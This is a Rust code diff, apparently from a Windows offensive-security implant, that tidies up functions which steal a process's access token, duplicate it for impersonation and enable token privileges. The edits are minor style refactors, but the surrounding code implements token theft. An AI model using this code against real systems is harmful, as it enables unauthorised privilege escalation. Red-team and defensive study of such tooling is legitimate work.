@@ -27,13 +27,12 @@ use super::{MakeCredentials, TokenEntry, TokenType};
 /// Opens the process token, duplicates it as an impersonation token,
 /// and returns a `TokenEntry` ready for vault insertion.
 pub fn steal_token(target_pid: u32, _target_handle: u32) -> Result<TokenEntry, u32> {
-    let mut process_handle: HANDLE = core::ptr::null_mut();
     let mut token_handle: HANDLE = core::ptr::null_mut();
     let mut dup_token: HANDLE = core::ptr::null_mut();
 
     unsafe {
         // Open the target process.
-        process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
+        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
         if process_handle.is_null() {
             return Err(GetLastError());
         }
@@ -296,16 +295,14 @@ pub fn enable_privilege(priv_name: &str) -> Result<bool, u32> {
             TRUE,
             &mut adj_handle,
         ) == FALSE
-        {
-            if OpenProcessToken(
+            && OpenProcessToken(
                 GetCurrentProcess(),
                 TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                 &mut adj_handle,
             ) == FALSE
-            {
-                CloseHandle(handle);
-                return Err(GetLastError());
-            }
+        {
+            CloseHandle(handle);
+            return Err(GetLastError());
         }
         CloseHandle(handle);
     }
@@ -320,13 +317,13 @@ pub fn enable_privilege(priv_name: &str) -> Result<bool, u32> {
         }
     }
 
-    let mut tp = TOKEN_PRIVILEGES {
+    let tp = TOKEN_PRIVILEGES {
         PrivilegeCount: 1,
         Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
     };
 
     unsafe {
-        if AdjustTokenPrivileges(adj_handle, FALSE, &mut tp, 0, ptr::null_mut(), ptr::null_mut())
+        if AdjustTokenPrivileges(adj_handle, FALSE, &tp, 0, ptr::null_mut(), ptr::null_mut())
             == FALSE
         {
             let err = GetLastError();
